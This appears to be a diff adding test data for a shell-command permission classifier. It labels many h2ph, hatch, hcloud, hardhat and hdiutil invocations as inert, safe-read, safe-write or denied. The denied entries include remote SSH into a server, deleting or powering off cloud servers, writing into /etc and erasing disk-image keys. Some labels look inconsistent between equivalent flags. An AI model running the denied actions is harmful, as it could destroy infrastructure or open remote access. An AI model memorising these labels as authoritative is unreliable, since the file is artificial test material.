@@ -1,0 +1,4125 @@
+h2ph	safe-write
+h2ph --help	denied
+h2ph --version	denied
+h2ph -D	safe-write
+h2ph -D -Q	safe-write
+h2ph -D -d x	safe-write
+h2ph -D x	safe-write
+h2ph -Q	safe-write
+h2ph -a	safe-write
+h2ph -d x	safe-write
+h2ph -e	safe-write
+h2ph -h	safe-write
+h2ph -l	safe-write
+h2ph -r	safe-write
+h2ph stdio.h	safe-write
+h2ph x	safe-write
+h2xs	safe-write
+h2xs --beta-version	safe-write
+h2xs --beta-version --compat-version x	safe-write
+h2xs --beta-version --debugging	safe-write
+h2xs --beta-version x	safe-write
+h2xs --compat-version x	safe-write
+h2xs --const-subs x	safe-write
+h2xs --cpp-flags x	safe-write
+h2xs --debugging	safe-write
+h2xs --default-type x	safe-write
+h2xs --force	safe-write
+h2xs --func-mask x	safe-write
+h2xs --gen-accessors	safe-write
+h2xs --gen-tied-var x	safe-write
+h2xs --global	safe-write
+h2xs --help	safe-write
+h2xs --name x	safe-write
+h2xs --omit-XS	safe-write
+h2xs --omit-autoload	safe-write
+h2xs --omit-changes	safe-write
+h2xs --omit-const-func	safe-write
+h2xs --omit-constant	safe-write
+h2xs --omit-enums x	safe-write
+h2xs --omit-pod	safe-write
+h2xs --opaque-re x	safe-write
+h2xs --overwrite-ok	safe-write
+h2xs --remove-prefix x	safe-write
+h2xs --skip-autoloader	safe-write
+h2xs --skip-exporter	safe-write
+h2xs --skip-ppport	safe-write
+h2xs --skip-strict	safe-write
+h2xs --skip-warnings	safe-write
+h2xs --use-new-tests	safe-write
+h2xs --use-old-tests	safe-write
+h2xs --version	safe-write
+h2xs -?	safe-write
+h2xs -A	safe-write
+h2xs -B	safe-write
+h2xs -C	safe-write
+h2xs -F x	safe-write
+h2xs -M x	safe-write
+h2xs -O	safe-write
+h2xs -P	safe-write
+h2xs -X	safe-write
+h2xs -X My::Module	safe-write
+h2xs -a	safe-write
+h2xs -b x	safe-write
+h2xs -d	safe-write
+h2xs -e x	safe-write
+h2xs -f	safe-write
+h2xs -g	safe-write
+h2xs -h	safe-write
+h2xs -k	safe-write
+h2xs -m	safe-write
+h2xs -n x	safe-write
+h2xs -o x	safe-write
+h2xs -p x	safe-write
+h2xs -s x	safe-write
+h2xs -t x	safe-write
+h2xs -v	safe-write
+h2xs -x	safe-write
+h2xs x	safe-write
+hadolint	denied
+hadolint --config	safe-read
+hadolint --config --config x	safe-read
+hadolint --config --disable-ignore-pragma	safe-read
+hadolint --config x	safe-read
+hadolint --disable-ignore-pragma	safe-read
+hadolint --failure-threshold	safe-read
+hadolint --failure-threshold x	safe-read
+hadolint --format	safe-read
+hadolint --format x	safe-read
+hadolint --help	safe-read
+hadolint --ignore	safe-read
+hadolint --ignore x	safe-read
+hadolint --no-color	safe-read
+hadolint --no-fail	safe-read
+hadolint --require-label	safe-read
+hadolint --require-label x	safe-read
+hadolint --strict-labels	safe-read
+hadolint --trusted-registry	safe-read
+hadolint --trusted-registry x	safe-read
+hadolint --verbose	safe-read
+hadolint --version	safe-read
+hadolint -V	safe-read
+hadolint -c	safe-read
+hadolint -c x	safe-read
+hadolint -f x	safe-read
+hadolint -h	safe-read
+hadolint -t	safe-read
+hadolint -t x	safe-read
+hadolint -v	safe-read
+hadolint x	safe-read
+haml	denied
+haml --help	inert
+haml --help --version	inert
+haml --help x	denied
+haml --version	inert
+haml -h	inert
+haml -v	inert
+haml x	denied
+haml-lint	safe-read
+haml-lint --auto-correct	safe-write
+haml-lint --auto-correct --auto-correct-all	safe-write
+haml-lint --auto-correct --config x	safe-write
+haml-lint --auto-correct x	safe-write
+haml-lint --auto-correct-all	safe-write
+haml-lint --auto-gen-config	safe-read
+haml-lint --color	safe-read
+haml-lint --config x	safe-read
+haml-lint --debug	safe-read
+haml-lint --display-cop-names	safe-read
+haml-lint --exclude x	safe-read
+haml-lint --exclude-linter x	safe-read
+haml-lint --fail-fast	safe-read
+haml-lint --fail-level x	safe-read
+haml-lint --file x	safe-read
+haml-lint --format x	safe-read
+haml-lint --help	safe-read
+haml-lint --include-linter x	safe-read
+haml-lint --no-color	safe-read
+haml-lint --no-summary	safe-read
+haml-lint --parallel	safe-read
+haml-lint --reporter x	safe-read
+haml-lint --show-linters	safe-read
+haml-lint --show-reporters	safe-read
+haml-lint --stdin	safe-read
+haml-lint --trace	safe-read
+haml-lint --version	safe-read
+haml-lint -A	safe-write
+haml-lint -a	safe-write
+haml-lint -c x	safe-read
+haml-lint -d	safe-read
+haml-lint -e x	safe-read
+haml-lint -f x	safe-read
+haml-lint -h	safe-read
+haml-lint -i x	safe-read
+haml-lint -p	safe-read
+haml-lint -r x	safe-read
+haml-lint -v	safe-read
+haml-lint -x x	safe-read
+haml-lint x	safe-read
+haproxy	denied
+haproxy --help	safe-read
+haproxy --help -D x	safe-read
+haproxy --help -V	safe-read
+haproxy --help x	safe-read
+haproxy --version	denied
+haproxy -D x	safe-read
+haproxy -N x	safe-read
+haproxy -V	safe-read
+haproxy -W x	safe-read
+haproxy -c	safe-read
+haproxy -d	safe-read
+haproxy -f x	safe-read
+haproxy -h	safe-read
+haproxy -n x	safe-read
+haproxy -p x	safe-read
+haproxy -q	safe-read
+haproxy -st x	safe-read
+haproxy -v	safe-read
+haproxy -vv	safe-read
+haproxy x	safe-read
+hardhat	denied
+hardhat --help	inert
+hardhat --help --version	denied
+hardhat --help x	denied
+hardhat --version	inert
+hardhat -h	inert
+hardhat check	safe-read
+hardhat check --help	safe-read
+hardhat check --help -h	safe-read
+hardhat check --help x	safe-read
+hardhat check -h	safe-read
+hardhat check x	safe-read
+hardhat clean	denied
+hardhat clean x	denied
+hardhat compile	denied
+hardhat compile x	denied
+hardhat console	denied
+hardhat console x	denied
+hardhat coverage	denied
+hardhat coverage x	denied
+hardhat deploy	denied
+hardhat deploy x	denied
+hardhat ethdebug	denied
+hardhat ethdebug x	denied
+hardhat flatten	safe-read
+hardhat flatten --help	safe-read
+hardhat flatten --help -h	safe-read
+hardhat flatten --help x	safe-read
+hardhat flatten -h	safe-read
+hardhat flatten x	safe-read
+hardhat help	inert
+hardhat help x	inert
+hardhat ignition	denied
+hardhat ignition x	denied
+hardhat init	denied
+hardhat init x	denied
+hardhat node	denied
+hardhat node x	denied
+hardhat run	denied
+hardhat run x	denied
+hardhat size-contracts	denied
+hardhat size-contracts x	denied
+hardhat test	denied
+hardhat test x	denied
+hardhat typechain	denied
+hardhat typechain x	denied
+hardhat vars	denied
+hardhat vars delete	denied
+hardhat vars delete x	denied
+hardhat vars get	inert
+hardhat vars get --help	inert
+hardhat vars get --help -h	inert
+hardhat vars get --help x	inert
+hardhat vars get -h	inert
+hardhat vars get x	inert
+hardhat vars list	inert
+hardhat vars list --help	inert
+hardhat vars list --help -h	inert
+hardhat vars list --help x	inert
+hardhat vars list -h	inert
+hardhat vars list x	inert
+hardhat vars path	inert
+hardhat vars path --help	inert
+hardhat vars path --help -h	inert
+hardhat vars path --help x	inert
+hardhat vars path -h	inert
+hardhat vars path x	inert
+hardhat vars set	denied
+hardhat vars set x	denied
+hardhat vars x	denied
+hardhat verify	denied
+hardhat verify x	denied
+hardhat version	inert
+hardhat version --help	inert
+hardhat version --help -h	inert
+hardhat version --help x	inert
+hardhat version -h	inert
+hardhat version x	inert
+hardhat x	denied
+hash	inert
+hash --help	denied
+hash --version	denied
+hash -d	inert
+hash -d -l	inert
+hash -d -p x	inert
+hash -d x	inert
+hash -l	inert
+hash -p x	inert
+hash -r	inert
+hash -t	inert
+hash x	inert
+hatch	denied
+hatch --cache-dir x	denied
+hatch --config x	denied
+hatch --data-dir ./.hatch build	safe-write
+hatch --data-dir /etc build	denied
+hatch --data-dir x	denied
+hatch --env x	denied
+hatch --help	inert
+hatch --help --cache-dir x	inert
+hatch --help --no-interactive	inert
+hatch --help x	denied
+hatch --no-interactive	denied
+hatch --project ./pkg build	safe-write
+hatch --project /etc build	denied
+hatch --project x	denied
+hatch --quiet	denied
+hatch --verbose	denied
+hatch --version	inert
+hatch -V	inert
+hatch -e x	denied
+hatch -h	inert
+hatch -n	denied
+hatch -p x	denied
+hatch -q	denied
+hatch -v	denied
+hatch build	safe-write
+hatch build --clean	safe-write
+hatch build --clean --clean-hooks-after	safe-write
+hatch build --clean --hooks-only x	safe-write
+hatch build --clean x	safe-write
+hatch build --clean-hooks-after	safe-write
+hatch build --clean-only	safe-write
+hatch build --ext	safe-write
+hatch build --help	safe-write
+hatch build --hooks-only x	safe-write
+hatch build --target x	safe-write
+hatch build -c	safe-write
+hatch build -h	safe-write
+hatch build -t x	safe-write
+hatch build x	safe-write
+hatch clean	safe-write
+hatch clean --ext	safe-write
+hatch clean --ext --help	safe-write
+hatch clean --ext --target x	safe-write
+hatch clean --ext x	safe-write
+hatch clean --help	safe-write
+hatch clean --no-hooks	safe-write
+hatch clean --target x	safe-write
+hatch clean -h	safe-write
+hatch clean -t x	safe-write
+hatch clean x	safe-write
+hatch config	denied
+hatch config x	denied
+hatch dep	inert
+hatch dep hash	inert
+hatch dep hash --help	inert
+hatch dep hash --help -h	inert
+hatch dep hash --help x	inert
+hatch dep hash -h	inert
+hatch dep hash x	inert
+hatch dep show	inert
+hatch dep show --help	inert
+hatch dep show --help -h	inert
+hatch dep show --help x	inert
+hatch dep show -h	inert
+hatch dep show x	inert
+hatch dep x	denied
+hatch env	inert
+hatch env create	inert
+hatch env create --help	inert
+hatch env create --help -h	inert
+hatch env create --help x	inert
+hatch env create -h	inert
+hatch env create x	inert
+hatch env find	inert
+hatch env find --help	inert
+hatch env find --help -h	inert
+hatch env find --help x	inert
+hatch env find -h	inert
+hatch env find x	inert
+hatch env prune	inert
+hatch env prune --help	inert
+hatch env prune --help -h	inert
+hatch env prune --help x	inert
+hatch env prune -h	inert
+hatch env prune x	inert
+hatch env remove	inert
+hatch env remove --help	inert
+hatch env remove --help -h	inert
+hatch env remove --help x	inert
+hatch env remove -h	inert
+hatch env remove x	inert
+hatch env run	inert
+hatch env run --help	inert
+hatch env run --help -h	inert
+hatch env run --help x	inert
+hatch env run -h	inert
+hatch env run x	inert
+hatch env show	inert
+hatch env show --ascii	inert
+hatch env show --ascii --force-ascii	inert
+hatch env show --ascii x	inert
+hatch env show --force-ascii	inert
+hatch env show --help	inert
+hatch env show --json	inert
+hatch env show -h	inert
+hatch env show x	inert
+hatch env x	denied
+hatch fmt	denied
+hatch fmt x	denied
+hatch help	inert
+hatch help x	inert
+hatch new	denied
+hatch new --cli	safe-write
+hatch new --cli --help	safe-write
+hatch new --cli x	safe-write
+hatch new --help	safe-write
+hatch new --init	safe-write
+hatch new -h	safe-write
+hatch new -i	safe-write
+hatch new x	safe-write
+hatch project	inert
+hatch project metadata	inert
+hatch project metadata --help	inert
+hatch project metadata --help -h	inert
+hatch project metadata --help x	inert
+hatch project metadata -h	inert
+hatch project metadata x	inert
+hatch project x	denied
+hatch publish	denied
+hatch publish x	denied
+hatch python	denied
+hatch python x	denied
+hatch run	denied
+hatch run x	denied
+hatch self	denied
+hatch self x	denied
+hatch shell	denied
+hatch shell x	denied
+hatch status	safe-read
+hatch status --help	safe-read
+hatch status --help -h	safe-read
+hatch status --help x	safe-read
+hatch status -h	safe-read
+hatch status x	safe-read
+hatch test	denied
+hatch test x	denied
+hatch version	safe-read
+hatch version --help	safe-read
+hatch version --help -h	safe-read
+hatch version --help x	safe-read
+hatch version -h	safe-read
+hatch version x	safe-read
+hatch x	denied
+hcloud	denied
+hcloud --help	inert
+hcloud --help --poll-interval x	inert
+hcloud --help --version	denied
+hcloud --help x	denied
+hcloud --poll-interval x	denied
+hcloud --version	inert
+hcloud -h	inert
+hcloud -v	inert
+hcloud all	denied
+hcloud all list	inert
+hcloud all list --help	inert
+hcloud all list --help --output x	inert
+hcloud all list --help -h	inert
+hcloud all list --help x	inert
+hcloud all list --output x	inert
+hcloud all list -h	inert
+hcloud all list -o x	inert
+hcloud all list x	inert
+hcloud all x	denied
+hcloud certificate	denied
+hcloud certificate describe	denied
+hcloud certificate describe --help	inert
+hcloud certificate describe --help --output x	inert
+hcloud certificate describe --help -h	inert
+hcloud certificate describe --help x	inert
+hcloud certificate describe --output x	inert
+hcloud certificate describe -h	inert
+hcloud certificate describe -o x	inert
+hcloud certificate describe x	inert
+hcloud certificate list	inert
+hcloud certificate list --help	inert
+hcloud certificate list --help --output x	inert
+hcloud certificate list --help -h	inert
+hcloud certificate list --help x	inert
+hcloud certificate list --output x	inert
+hcloud certificate list --selector x	inert
+hcloud certificate list -h	inert
+hcloud certificate list -l x	inert
+hcloud certificate list -o x	inert
+hcloud certificate list x	inert
+hcloud certificate x	denied
+hcloud context	denied
+hcloud context active	inert
+hcloud context active --help	inert
+hcloud context active --help -h	inert
+hcloud context active --help x	inert
+hcloud context active -h	inert
+hcloud context active x	inert
+hcloud context create prod	denied
+hcloud context list	inert
+hcloud context list --help	inert
+hcloud context list --help -h	inert
+hcloud context list --help x	inert
+hcloud context list -h	inert
+hcloud context list x	inert
+hcloud context x	denied
+hcloud datacenter	denied
+hcloud datacenter describe	denied
+hcloud datacenter describe --help	inert
+hcloud datacenter describe --help --output x	inert
+hcloud datacenter describe --help -h	inert
+hcloud datacenter describe --help x	inert
+hcloud datacenter describe --output x	inert
+hcloud datacenter describe -h	inert
+hcloud datacenter describe -o x	inert
+hcloud datacenter describe x	inert
+hcloud datacenter list	inert
+hcloud datacenter list --help	inert
+hcloud datacenter list --help --output x	inert
+hcloud datacenter list --help -h	inert
+hcloud datacenter list --help x	inert
+hcloud datacenter list --output x	inert
+hcloud datacenter list -h	inert
+hcloud datacenter list -o x	inert
+hcloud datacenter list x	inert
+hcloud datacenter x	denied
+hcloud firewall	denied
+hcloud firewall describe	denied
+hcloud firewall describe --help	inert
+hcloud firewall describe --help --output x	inert
+hcloud firewall describe --help -h	inert
+hcloud firewall describe --help x	inert
+hcloud firewall describe --output x	inert
+hcloud firewall describe -h	inert
+hcloud firewall describe -o x	inert
+hcloud firewall describe x	inert
+hcloud firewall list	inert
+hcloud firewall list --help	inert
+hcloud firewall list --help --output x	inert
+hcloud firewall list --help -h	inert
+hcloud firewall list --help x	inert
+hcloud firewall list --output x	inert
+hcloud firewall list --selector x	inert
+hcloud firewall list -h	inert
+hcloud firewall list -l x	inert
+hcloud firewall list -o x	inert
+hcloud firewall list x	inert
+hcloud firewall x	denied
+hcloud floating-ip	denied
+hcloud floating-ip describe	denied
+hcloud floating-ip describe --help	inert
+hcloud floating-ip describe --help --output x	inert
+hcloud floating-ip describe --help -h	inert
+hcloud floating-ip describe --help x	inert
+hcloud floating-ip describe --output x	inert
+hcloud floating-ip describe -h	inert
+hcloud floating-ip describe -o x	inert
+hcloud floating-ip describe x	inert
+hcloud floating-ip list	inert
+hcloud floating-ip list --help	inert
+hcloud floating-ip list --help --output x	inert
+hcloud floating-ip list --help -h	inert
+hcloud floating-ip list --help x	inert
+hcloud floating-ip list --output x	inert
+hcloud floating-ip list --selector x	inert
+hcloud floating-ip list -h	inert
+hcloud floating-ip list -l x	inert
+hcloud floating-ip list -o x	inert
+hcloud floating-ip list x	inert
+hcloud floating-ip x	denied
+hcloud image	denied
+hcloud image describe	denied
+hcloud image describe --help	inert
+hcloud image describe --help --output x	inert
+hcloud image describe --help -h	inert
+hcloud image describe --help x	inert
+hcloud image describe --output x	inert
+hcloud image describe -h	inert
+hcloud image describe -o x	inert
+hcloud image describe x	inert
+hcloud image list	inert
+hcloud image list --help	inert
+hcloud image list --help --output x	inert
+hcloud image list --help -h	inert
+hcloud image list --help x	inert
+hcloud image list --output x	inert
+hcloud image list --selector x	inert
+hcloud image list --type system	inert
+hcloud image list --type x	inert
+hcloud image list -h	inert
+hcloud image list -l x	inert
+hcloud image list -o x	inert
+hcloud image list x	inert
+hcloud image x	denied
+hcloud iso	denied
+hcloud iso describe	denied
+hcloud iso describe --help	inert
+hcloud iso describe --help --output x	inert
+hcloud iso describe --help -h	inert
+hcloud iso describe --help x	inert
+hcloud iso describe --output x	inert
+hcloud iso describe -h	inert
+hcloud iso describe -o x	inert
+hcloud iso describe x	inert
+hcloud iso list	inert
+hcloud iso list --help	inert
+hcloud iso list --help --output x	inert
+hcloud iso list --help -h	inert
+hcloud iso list --help x	inert
+hcloud iso list --output x	inert
+hcloud iso list -h	inert
+hcloud iso list -o x	inert
+hcloud iso list x	inert
+hcloud iso x	denied
+hcloud load-balancer	denied
+hcloud load-balancer describe	denied
+hcloud load-balancer describe --help	inert
+hcloud load-balancer describe --help --output x	inert
+hcloud load-balancer describe --help -h	inert
+hcloud load-balancer describe --help x	inert
+hcloud load-balancer describe --output x	inert
+hcloud load-balancer describe -h	inert
+hcloud load-balancer describe -o x	inert
+hcloud load-balancer describe x	inert
+hcloud load-balancer list	inert
+hcloud load-balancer list --help	inert
+hcloud load-balancer list --help --output x	inert
+hcloud load-balancer list --help -h	inert
+hcloud load-balancer list --help x	inert
+hcloud load-balancer list --output x	inert
+hcloud load-balancer list --selector x	inert
+hcloud load-balancer list -h	inert
+hcloud load-balancer list -l x	inert
+hcloud load-balancer list -o x	inert
+hcloud load-balancer list x	inert
+hcloud load-balancer x	denied
+hcloud load-balancer-type	denied
+hcloud load-balancer-type describe	denied
+hcloud load-balancer-type describe --help	inert
+hcloud load-balancer-type describe --help --output x	inert
+hcloud load-balancer-type describe --help -h	inert
+hcloud load-balancer-type describe --help x	inert
+hcloud load-balancer-type describe --output x	inert
+hcloud load-balancer-type describe -h	inert
+hcloud load-balancer-type describe -o x	inert
+hcloud load-balancer-type describe x	inert
+hcloud load-balancer-type list	inert
+hcloud load-balancer-type list --help	inert
+hcloud load-balancer-type list --help --output x	inert
+hcloud load-balancer-type list --help -h	inert
+hcloud load-balancer-type list --help x	inert
+hcloud load-balancer-type list --output x	inert
+hcloud load-balancer-type list -h	inert
+hcloud load-balancer-type list -o x	inert
+hcloud load-balancer-type list x	inert
+hcloud load-balancer-type x	denied
+hcloud location	denied
+hcloud location describe	denied
+hcloud location describe --help	inert
+hcloud location describe --help --output x	inert
+hcloud location describe --help -h	inert
+hcloud location describe --help x	inert
+hcloud location describe --output x	inert
+hcloud location describe -h	inert
+hcloud location describe -o x	inert
+hcloud location describe x	inert
+hcloud location list	inert
+hcloud location list --help	inert
+hcloud location list --help --output x	inert
+hcloud location list --help -h	inert
+hcloud location list --help x	inert
+hcloud location list --output x	inert
+hcloud location list -h	inert
+hcloud location list -o x	inert
+hcloud location list x	inert
+hcloud location x	denied
+hcloud network	denied
+hcloud network describe	denied
+hcloud network describe --help	inert
+hcloud network describe --help --output x	inert
+hcloud network describe --help -h	inert
+hcloud network describe --help x	inert
+hcloud network describe --output x	inert
+hcloud network describe -h	inert
+hcloud network describe -o x	inert
+hcloud network describe x	inert
+hcloud network list	inert
+hcloud network list --help	inert
+hcloud network list --help --output x	inert
+hcloud network list --help -h	inert
+hcloud network list --help x	inert
+hcloud network list --output x	inert
+hcloud network list --selector x	inert
+hcloud network list -h	inert
+hcloud network list -l x	inert
+hcloud network list -o x	inert
+hcloud network list x	inert
+hcloud network x	denied
+hcloud placement-group	denied
+hcloud placement-group describe	denied
+hcloud placement-group describe --help	inert
+hcloud placement-group describe --help --output x	inert
+hcloud placement-group describe --help -h	inert
+hcloud placement-group describe --help x	inert
+hcloud placement-group describe --output x	inert
+hcloud placement-group describe -h	inert
+hcloud placement-group describe -o x	inert
+hcloud placement-group describe x	inert
+hcloud placement-group list	inert
+hcloud placement-group list --help	inert
+hcloud placement-group list --help --output x	inert
+hcloud placement-group list --help -h	inert
+hcloud placement-group list --help x	inert
+hcloud placement-group list --output x	inert
+hcloud placement-group list --selector x	inert
+hcloud placement-group list -h	inert
+hcloud placement-group list -l x	inert
+hcloud placement-group list -o x	inert
+hcloud placement-group list x	inert
+hcloud placement-group x	denied
+hcloud primary-ip	denied
+hcloud primary-ip describe	denied
+hcloud primary-ip describe --help	inert
+hcloud primary-ip describe --help --output x	inert
+hcloud primary-ip describe --help -h	inert
+hcloud primary-ip describe --help x	inert
+hcloud primary-ip describe --output x	inert
+hcloud primary-ip describe -h	inert
+hcloud primary-ip describe -o x	inert
+hcloud primary-ip describe x	inert
+hcloud primary-ip list	inert
+hcloud primary-ip list --help	inert
+hcloud primary-ip list --help --output x	inert
+hcloud primary-ip list --help -h	inert
+hcloud primary-ip list --help x	inert
+hcloud primary-ip list --output x	inert
+hcloud primary-ip list --selector x	inert
+hcloud primary-ip list -h	inert
+hcloud primary-ip list -l x	inert
+hcloud primary-ip list -o x	inert
+hcloud primary-ip list x	inert
+hcloud primary-ip x	denied
+hcloud server	denied
+hcloud server create --name x --type cx11 --image debian-12	denied
+hcloud server delete my-server	denied
+hcloud server describe	denied
+hcloud server describe --help	inert
+hcloud server describe --help --output x	inert
+hcloud server describe --help -h	inert
+hcloud server describe --help x	inert
+hcloud server describe --output x	inert
+hcloud server describe -h	inert
+hcloud server describe -o x	inert
+hcloud server describe my-server	inert
+hcloud server describe x	inert
+hcloud server list	inert
+hcloud server list --help	inert
+hcloud server list --help --output x	inert
+hcloud server list --help -h	inert
+hcloud server list --help x	inert
+hcloud server list --output x	inert
+hcloud server list --selector x	inert
+hcloud server list -h	inert
+hcloud server list -l x	inert
+hcloud server list -o json	inert
+hcloud server list -o x	inert
+hcloud server list x	inert
+hcloud server poweroff my-server	denied
+hcloud server ssh my-server	denied
+hcloud server x	denied
+hcloud server-type	denied
+hcloud server-type describe	denied
+hcloud server-type describe --help	inert
+hcloud server-type describe --help --output x	inert
+hcloud server-type describe --help -h	inert
+hcloud server-type describe --help x	inert
+hcloud server-type describe --output x	inert
+hcloud server-type describe -h	inert
+hcloud server-type describe -o x	inert
+hcloud server-type describe x	inert
+hcloud server-type list	inert
+hcloud server-type list --help	inert
+hcloud server-type list --help --output x	inert
+hcloud server-type list --help -h	inert
+hcloud server-type list --help x	inert
+hcloud server-type list --output x	inert
+hcloud server-type list -h	inert
+hcloud server-type list -o x	inert
+hcloud server-type list x	inert
+hcloud server-type x	denied
+hcloud ssh-key	denied
+hcloud ssh-key describe	denied
+hcloud ssh-key describe --help	inert
+hcloud ssh-key describe --help --output x	inert
+hcloud ssh-key describe --help -h	inert
+hcloud ssh-key describe --help x	inert
+hcloud ssh-key describe --output x	inert
+hcloud ssh-key describe -h	inert
+hcloud ssh-key describe -o x	inert
+hcloud ssh-key describe x	inert
+hcloud ssh-key list	inert
+hcloud ssh-key list --help	inert
+hcloud ssh-key list --help --output x	inert
+hcloud ssh-key list --help -h	inert
+hcloud ssh-key list --help x	inert
+hcloud ssh-key list --output x	inert
+hcloud ssh-key list --selector x	inert
+hcloud ssh-key list -h	inert
+hcloud ssh-key list -l x	inert
+hcloud ssh-key list -o x	inert
+hcloud ssh-key list x	inert
+hcloud ssh-key x	denied
+hcloud storage-box	denied
+hcloud storage-box describe	denied
+hcloud storage-box describe --help	inert
+hcloud storage-box describe --help --output x	inert
+hcloud storage-box describe --help -h	inert
+hcloud storage-box describe --help x	inert
+hcloud storage-box describe --output x	inert
+hcloud storage-box describe -h	inert
+hcloud storage-box describe -o x	inert
+hcloud storage-box describe x	inert
+hcloud storage-box list	inert
+hcloud storage-box list --help	inert
+hcloud storage-box list --help --output x	inert
+hcloud storage-box list --help -h	inert
+hcloud storage-box list --help x	inert
+hcloud storage-box list --output x	inert
+hcloud storage-box list --selector x	inert
+hcloud storage-box list -h	inert
+hcloud storage-box list -l x	inert
+hcloud storage-box list -o x	inert
+hcloud storage-box list x	inert
+hcloud storage-box x	denied
+hcloud storage-box-type	denied
+hcloud storage-box-type describe	denied
+hcloud storage-box-type describe --help	inert
+hcloud storage-box-type describe --help --output x	inert
+hcloud storage-box-type describe --help -h	inert
+hcloud storage-box-type describe --help x	inert
+hcloud storage-box-type describe --output x	inert
+hcloud storage-box-type describe -h	inert
+hcloud storage-box-type describe -o x	inert
+hcloud storage-box-type describe x	inert
+hcloud storage-box-type list	inert
+hcloud storage-box-type list --help	inert
+hcloud storage-box-type list --help --output x	inert
+hcloud storage-box-type list --help -h	inert
+hcloud storage-box-type list --help x	inert
+hcloud storage-box-type list --output x	inert
+hcloud storage-box-type list -h	inert
+hcloud storage-box-type list -o x	inert
+hcloud storage-box-type list x	inert
+hcloud storage-box-type x	denied
+hcloud version	inert
+hcloud version x	inert
+hcloud volume	denied
+hcloud volume describe	denied
+hcloud volume describe --help	inert
+hcloud volume describe --help --output x	inert
+hcloud volume describe --help -h	inert
+hcloud volume describe --help x	inert
+hcloud volume describe --output x	inert
+hcloud volume describe -h	inert
+hcloud volume describe -o x	inert
+hcloud volume describe x	inert
+hcloud volume list	inert
+hcloud volume list --help	inert
+hcloud volume list --help --output x	inert
+hcloud volume list --help -h	inert
+hcloud volume list --help x	inert
+hcloud volume list --output x	inert
+hcloud volume list --selector x	inert
+hcloud volume list -h	inert
+hcloud volume list -l x	inert
+hcloud volume list -o x	inert
+hcloud volume list x	inert
+hcloud volume x	denied
+hcloud x	denied
+hcloud zone	denied
+hcloud zone describe	denied
+hcloud zone describe --help	inert
+hcloud zone describe --help --output x	inert
+hcloud zone describe --help -h	inert
+hcloud zone describe --help x	inert
+hcloud zone describe --output x	inert
+hcloud zone describe -h	inert
+hcloud zone describe -o x	inert
+hcloud zone describe x	inert
+hcloud zone list	inert
+hcloud zone list --help	inert
+hcloud zone list --help --output x	inert
+hcloud zone list --help -h	inert
+hcloud zone list --help x	inert
+hcloud zone list --output x	inert
+hcloud zone list --selector x	inert
+hcloud zone list -h	inert
+hcloud zone list -l x	inert
+hcloud zone list -o x	inert
+hcloud zone list x	inert
+hcloud zone x	denied
+hdiutil	denied
+hdiutil --help	inert
+hdiutil --help -h	denied
+hdiutil --help x	denied
+hdiutil --version	denied
+hdiutil -h	inert
+hdiutil attach	denied
+hdiutil attach x	denied
+hdiutil burn	denied
+hdiutil burn x	denied
+hdiutil checksum	denied
+hdiutil checksum -debug	inert
+hdiutil checksum -debug -h	inert
+hdiutil checksum -debug -imagekey x	inert
+hdiutil checksum -debug x	inert
+hdiutil checksum -h	inert
+hdiutil checksum -help	inert
+hdiutil checksum -imagekey x	inert
+hdiutil checksum -plist	inert
+hdiutil checksum -puppetstrings	inert
+hdiutil checksum -quiet	inert
+hdiutil checksum -srcimagekey x	inert
+hdiutil checksum -type x	inert
+hdiutil checksum -verbose	inert
+hdiutil checksum x	inert
+hdiutil chpass	denied
+hdiutil chpass x	denied
+hdiutil compact	denied
+hdiutil compact x	denied
+hdiutil convert	denied
+hdiutil convert x	denied
+hdiutil create	denied
+hdiutil create x	denied
+hdiutil detach	denied
+hdiutil detach x	denied
+hdiutil erasekeys	denied
+hdiutil erasekeys x	denied
+hdiutil help	inert
+hdiutil help x	inert
+hdiutil imageinfo	denied
+hdiutil imageinfo -bookmark	inert
+hdiutil imageinfo -bookmark -checksum	inert
+hdiutil imageinfo -bookmark -imagekey x	inert
+hdiutil imageinfo -bookmark x	inert
+hdiutil imageinfo -checksum	inert
+hdiutil imageinfo -debug	inert
+hdiutil imageinfo -encryption	inert
+hdiutil imageinfo -format	inert
+hdiutil imageinfo -h	inert
+hdiutil imageinfo -help	inert
+hdiutil imageinfo -imagekey x	inert
+hdiutil imageinfo -plist	inert
+hdiutil imageinfo -puppetstrings	inert
+hdiutil imageinfo -quiet	inert
+hdiutil imageinfo -srcimagekey x	inert
+hdiutil imageinfo -verbose	inert
+hdiutil imageinfo x	inert
+hdiutil info	inert
+hdiutil info -debug	inert
+hdiutil info -debug -h	inert
+hdiutil info -debug x	inert
+hdiutil info -h	inert
+hdiutil info -help	inert
+hdiutil info -plist	inert
+hdiutil info -puppetstrings	inert
+hdiutil info -quiet	inert
+hdiutil info -verbose	inert
+hdiutil info x	inert
+hdiutil isencrypted	denied
+hdiutil isencrypted -debug	inert
+hdiutil isencrypted -debug -h	inert
+hdiutil isencrypted -debug x	inert
+hdiutil isencrypted -h	inert
+hdiutil isencrypted -help	inert
+hdiutil isencrypted -plist	inert
+hdiutil isencrypted -puppetstrings	inert
+hdiutil isencrypted -quiet	inert
+hdiutil isencrypted -verbose	inert
+hdiutil isencrypted x	inert
+hdiutil makehybrid	denied
+hdiutil makehybrid x	denied
+hdiutil mount	denied
+hdiutil mount x	denied
+hdiutil mountvol	denied
+hdiutil mountvol x	denied
+hdiutil plugins	inert
+hdiutil plugins -debug	inert
+hdiutil plugins -debug -h	inert
+hdiutil plugins -debug x	inert
+hdiutil plugins -h	inert
+hdiutil plugins -help	inert
+hdiutil plugins -plist	inert
+hdiutil plugins -puppetstrings	inert
+hdiutil plugins -quiet	inert
+hdiutil plugins -verbose	inert
+hdiutil plugins x	inert
+hdiutil pmap	denied
+hdiutil pmap -debug	inert
+hdiutil pmap -debug -h	inert
+hdiutil pmap -debug x	inert
+hdiutil pmap -h	inert
+hdiutil pmap -help	inert
+hdiutil pmap -plist	inert
+hdiutil pmap -puppetstrings	inert
+hdiutil pmap -quiet	inert
+hdiutil pmap -verbose	inert
+hdiutil pmap x	inert
+hdiutil resize	denied
+hdiutil resize x	denied
+hdiutil segment	denied
+hdiutil segment x	denied
+hdiutil udifderez	denied
+hdiutil udifderez -debug	inert
+hdiutil udifderez -debug -h	inert
+hdiutil udifderez -debug -xml x	inert
+hdiutil udifderez -debug x	inert
+hdiutil udifderez -h	inert
+hdiutil udifderez -help	inert
+hdiutil udifderez -plist	inert
+hdiutil udifderez -puppetstrings	inert
+hdiutil udifderez -quiet	inert
+hdiutil udifderez -verbose	inert
+hdiutil udifderez -xml x	inert
+hdiutil udifderez x	inert
+hdiutil udifrez	denied
+hdiutil udifrez x	denied
+hdiutil unmount	denied
+hdiutil unmount x	denied
+hdiutil verify	denied
+hdiutil verify -debug	inert
